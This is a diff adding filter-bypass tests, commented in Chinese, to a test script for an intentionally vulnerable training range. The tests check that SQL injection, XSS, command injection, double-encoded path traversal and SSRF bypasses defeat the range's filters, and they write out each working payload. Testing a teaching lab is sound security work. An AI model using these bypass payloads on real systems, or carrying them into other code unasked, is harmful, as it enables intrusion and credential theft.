@@ -1127,6 +1127,196 @@ body=$(page -b "$JAR" "$BASE/v/csrf/json_api/profile")
 expect_has "邮箱确实被改成了攻击者的值" "attacker@evil.example" "$body"
 rm -f "$JAR"
 
+step "14. 绕过专题：过滤器拦住了什么，又是怎么绕过去的"
+
+# ---- sqli/keyword_filter：规则按"字面量"匹配，不是按"结构"
+expect_unsolved "sqli/keyword_filter" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/sqli/keyword_filter/" --data-urlencode "keyword=张")
+expect_has "正常搜索能出员工" "张三" "$body"
+
+body=$(page -X POST "$BASE/v/sqli/keyword_filter/" \
+  --data-urlencode "keyword=x' UNION SELECT username,password,role FROM users-- ")
+expect_has "经典 payload 被「注释」规则拦下" "注释" "$body"
+expect_no "被拦时连结果都不给" "张三" "$body"
+
+body=$(page -X POST "$BASE/v/sqli/keyword_filter/" \
+  --data-urlencode "keyword=x' UNION  SELECT username,password,role FROM users WHERE 1=1 OR 'a'='a")
+expect_has "用 OR 的写法被「布尔运算」规则拦下" "布尔运算" "$body"
+
+body=$(page -X POST "$BASE/v/sqli/keyword_filter/" \
+  --data-urlencode "keyword=x' UNION  SELECT name,1,1 FROM sqlite_master")
+expect_has "查系统表被「系统表」规则拦下" "系统表" "$body"
+
+# 那条规则只认"union 后面跟**一个**空格再跟 select"
+body=$(page -X POST "$BASE/v/sqli/keyword_filter/" \
+  --data-urlencode "keyword=x' UNION  SELECT username,password,role FROM users WHERE 'b'LIKE'b")
+expect_no "双空格 payload 一条规则都没命中" "被安全策略拦截" "$body"
+expect_has "users 表被接出来了" "S3cr3t-1nj3ct3d" "$body"
+expect_unsolved "sqli/keyword_filter" "绕过了过滤器但还没提交密码"
+
+# 阶梯没塌：`UNION SELECT 1,2,3`（找显示位那一步）只达成目标一，不算通关
+body=$(page -X POST "$BASE/v/sqli/keyword_filter/" \
+  --data-urlencode "keyword=x' UNION  SELECT 1,2,3 WHERE 'b'LIKE'b")
+expect_unsolved "sqli/keyword_filter" "只找到显示位还不算通关（阶梯没塌）"
+
+# 制表符 / 换行 是等价的另外两种绕过
+for sep_name in 制表符 换行; do
+  if [ "$sep_name" = "制表符" ]; then
+    kw=$(printf "x' UNION\tSELECT username,password,role FROM users WHERE 'b'LIKE'b")
+  else
+    kw=$(printf "x' UNION\nSELECT username,password,role FROM users WHERE 'b'LIKE'b")
+  fi
+  body=$(page -X POST "$BASE/v/sqli/keyword_filter/" --data-urlencode "keyword=$kw")
+  expect_has "$sep_name 分隔同样能绕过" "S3cr3t-1nj3ct3d" "$body"
+done
+
+curl -s -o /dev/null -X POST "$BASE/v/sqli/keyword_filter/" \
+  --data-urlencode "guess=S3cr3t-1nj3ct3d"
+expect_solved "sqli/keyword_filter" "check() 确认两个目标都达成"
+
+# ---- xss/tag_filter：删除式过滤器是可逆的
+expect_unsolved "xss/tag_filter" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/xss/tag_filter/" \
+  --data-urlencode "author=测试" --data-urlencode "body=<script>fetch(1)</script>")
+expect_has "script 标签被过滤器认出来了" "script 标签" "$body"
+expect_unsolved "xss/tag_filter" "老老实实写 script 标签不管用"
+
+# 反向：光写一行带 `on...=` 的纯文本不能被判成通关。
+# （判定检测器早先只写 `on\w+=`，结果这种东西会被误判 —— 实测踩出来的。）
+body=$(page -X POST "$BASE/v/xss/tag_filter/" \
+  --data-urlencode "author=测试" --data-urlencode "body=onerror= 只是文字，不是标签")
+expect_unsolved "xss/tag_filter" "纯文本里的 onerror= 不算打通"
+
+# 路子一：嵌套写法，让它删完自己拼回一个完整标签
+nested='<scr<script>ipt>fetch(1)</scr</script>ipt>'
+body=$(page -X POST "$BASE/v/xss/tag_filter/" \
+  --data-urlencode "author=测试" --data-urlencode "body=$nested")
+expect_has "嵌套写法让过滤器把 script 标签拼了回来" \
+  "&lt;script&gt;fetch(1)&lt;/script&gt;" "$body"
+expect_solved "xss/tag_filter" "check() 确认删除式过滤器被绕过"
+
+# 路子二：srcdoc 容器，把 payload 编码起来塞进去
+curl -s -o /dev/null -X POST "$BASE/__vuln4all/reset" \
+  --data-urlencode "id=xss/tag_filter" --data-urlencode "next=/"
+expect_unsolved "xss/tag_filter" "reset 之后回到未通关"
+
+body=$(page -X POST "$BASE/v/xss/tag_filter/" \
+  --data-urlencode "author=测试" \
+  --data-urlencode 'body=<iframe srcdoc="&lt;svg/onload=fetch(1)&gt;"></iframe>')
+expect_has "srcdoc 里的编码 payload 原样存进去了" "srcdoc" "$body"
+expect_solved "xss/tag_filter" "srcdoc 那条路同样算通关"
+
+# ---- command_injection/space_filter：黑名单漏了换行
+expect_unsolved "command_injection/space_filter" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/command_injection/space_filter/" \
+  --data-urlencode "target=127.0.0.1; id")
+expect_has "分号被「分号」规则拦下" "分号" "$body"
+
+body=$(page -X POST "$BASE/v/command_injection/space_filter/" \
+  --data-urlencode "target=127.0.0.1 | id")
+expect_has "管道被「管道与后台」规则拦下" "管道与后台" "$body"
+
+# 换行是 shell 里跟分号等价的分隔符，而过滤器没拦它
+inj=$(printf '127.0.0.1\nid')
+body=$(page -X POST "$BASE/v/command_injection/space_filter/" --data-urlencode "target=$inj")
+expect_no "换行 payload 不被拦" "被安全策略拦截" "$body"
+expect_has "id 真的跑起来了" "uid=" "$body"
+
+# ${IFS} 替空格。这里必须用单引号，否则 bash 会先把 ${IFS} 展开掉
+inj=$(printf '127.0.0.1\nhead${IFS}-c${IFS}20${IFS}/etc/hostname')
+body=$(page -X POST "$BASE/v/command_injection/space_filter/" --data-urlencode "target=$inj")
+expect_no '${IFS} 替空格的 payload 不被拦' "被安全策略拦截" "$body"
+expect_has 'head 被跑起来了（换行 + ${IFS} 都对）' "hostname" "$body"
+
+# 真的在跑 shell，所以得自己把输出量夹住 —— /dev/zero 不能撑爆内存和磁盘
+inj=$(printf '127.0.0.1\ncat${IFS}/dev/zero')
+body=$(page -X POST "$BASE/v/command_injection/space_filter/" --data-urlencode "target=$inj")
+expect_has "吐不完的输出被 head 截住了" "输出过长" "$body"
+expect_unsolved "command_injection/space_filter" "输出一堆 \\0 不算通关"
+
+# 目标文件的完整路径从页面里读，别硬编码 —— 页面上那条线断了要能发现
+sp_page=$(page "$BASE/v/command_injection/space_filter/")
+secret=$(printf '%s' "$sp_page" | grep -oE '/[^ <>"|]*ops-token\.txt' | head -n1)
+if [ -n "$secret" ]; then
+  ok "从页面里读到了目标文件路径（$secret）"
+else
+  bad "页面里找不到目标文件路径"
+fi
+
+inj=$(printf '127.0.0.1\nhead${IFS}-c${IFS}300${IFS}%s' "$secret")
+body=$(page -X POST "$BASE/v/command_injection/space_filter/" --data-urlencode "target=$inj")
+expect_has "读到了内部凭据" "OPS-TOKEN-7f3a91c4" "$body"
+expect_solved "command_injection/space_filter" "check() 确认执行日志里有凭据"
+
+# ---- path_traversal/encoding_filter：过滤器和解码层没对齐
+expect_unsolved "path_traversal/encoding_filter" "动手之前 check() 说未通关"
+
+body=$(page "$BASE/v/path_traversal/encoding_filter/download?file=readme.txt")
+expect_has "共享目录里的文件正常能下" "对外共享的资料" "$body"
+
+body=$(page "$BASE/v/path_traversal/encoding_filter/download?file=..%2fprivate%2fops-token.txt")
+expect_has "单次编码的 ../ 被「上级目录」规则拦下" "上级目录" "$body"
+
+body=$(page "$BASE/v/path_traversal/encoding_filter/download?file=%252e%252e%252fprivate%252fops-token.txt")
+expect_has "路径绕过去了，但文件名里的敏感词还被拦" "敏感文件名" "$body"
+
+body=$(page "$BASE/v/path_traversal/encoding_filter/download?file=%252e%252e%252fprivate%252fops-%2574oken.txt")
+expect_has "路径和文件名都双重编码之后穿过去了" "NETDISK-TOKEN-9c41b7" "$body"
+expect_solved "path_traversal/encoding_filter" "check() 确认穿越成功"
+
+# 双编码同样能构造出绝对路径。设备文件必须被挡住 —— 不然一个请求
+# 就能把 worker 挂在 `read_text()` 上永远读不完。
+code=$(curl -s -o /dev/null -w '%{http_code}' \
+  "$BASE/v/path_traversal/encoding_filter/download?file=%252fdev%252fzero")
+expect_code "双编码成 /dev/zero 不会挂住，而且被挡住" "$code" "200"
+body=$(page "$BASE/v/path_traversal/encoding_filter/download?file=%252fdev%252fzero")
+expect_has "设备文件被挡在普通文件检查之外" "不是普通文件" "$body"
+
+# ---- ssrf/ip_format_filter：地址不是字符串
+expect_unsolved "ssrf/ip_format_filter" "动手之前 check() 说未通关"
+
+body=$(page "$BASE/intranet/")
+expect_has "内网后台本身是可达的" "INTRANET-ADMIN-4e82d1" "$body"
+
+# 内网后台的端口**从页面里读**，别用脚本自己的 $PORT：
+# 页面上的地址是模块用 request.host 算出来的，算错了（比如漏了端口）
+# 这条线就断了，而硬编码的断言照样会绿。
+ssrf_page=$(page "$BASE/v/ssrf/ip_format_filter/")
+intranet_url=$(printf '%s' "$ssrf_page" \
+  | grep -oE 'http://127\.0\.0\.1:[0-9]+/intranet/' | head -n1)
+iport=$(printf '%s' "$intranet_url" | sed -E 's#.*:([0-9]+)/intranet/#\1#')
+if [ "$iport" = "$PORT" ]; then
+  ok "页面上算出来的内网后台端口是对的（$iport）"
+else
+  bad "页面算出的端口是「$iport」，跟靶场实际端口 $PORT 对不上 —— 那条线断了"
+fi
+
+body=$(page -X POST "$BASE/v/ssrf/ip_format_filter/" \
+  --data-urlencode "url=http://127.0.0.1:${iport}/intranet/")
+expect_has "明文 127.0.0.1 被「回环地址字面量」拦下" "回环地址字面量" "$body"
+
+body=$(page -X POST "$BASE/v/ssrf/ip_format_filter/" \
+  --data-urlencode "url=http://localhost:${iport}/intranet/")
+expect_has "localhost 同样被拦" "回环地址字面量" "$body"
+
+body=$(page -X POST "$BASE/v/ssrf/ip_format_filter/" \
+  --data-urlencode "url=http://[::ffff:127.0.0.1]:${iport}/intranet/")
+expect_has "带 127.0.0.1 字样的 IPv6 写法也会被拦（容易踩的细节）" "回环地址字面量" "$body"
+
+for host in 2130706433 0x7f000001 017700000001 127.1 0 "[::ffff:7f00:1]"; do
+  body=$(page -X POST "$BASE/v/ssrf/ip_format_filter/" \
+    --data-urlencode "url=http://${host}:${iport}/intranet/")
+  if printf '%s' "$body" | grep -q "INTRANET-ADMIN-4e82d1"; then
+    ok "IP 写法 ${host} 绕过了黑名单"
+  else
+    bad "IP 写法 ${host} 没能绕过 —— writeup 里写了这个，得改文档"
+  fi
+done
+expect_solved "ssrf/ip_format_filter" "check() 确认内网后台被访问到"
+
 step "结果"
 printf '  通过 %d 项，失败 %d 项\n' "$PASS" "$FAIL"
 if [ "$FAIL" != "0" ]; then
